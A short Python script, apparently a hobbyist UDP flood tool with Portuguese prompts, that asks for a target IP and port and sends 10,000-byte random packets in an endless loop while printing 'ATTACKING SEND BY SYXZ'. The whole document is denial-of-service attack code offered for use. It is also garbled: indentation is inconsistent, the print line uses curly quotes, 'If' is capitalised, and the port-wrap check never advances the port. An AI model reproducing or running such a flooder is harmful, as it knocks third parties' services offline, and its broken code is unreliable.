import os, time, socket, random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout = time.time ()

ip = input ("digite o ip:")
port = int(input("digite a porta:"))

while True:
       while 1:
             if time.time() > timeout:
                  break
             else:
                   pass
        sock.sendto(bytes, (ip,port))
        print(“ ( + ) ATTACKING SEND BY SYXZ - “)
         If port == 65500:
          port = 1
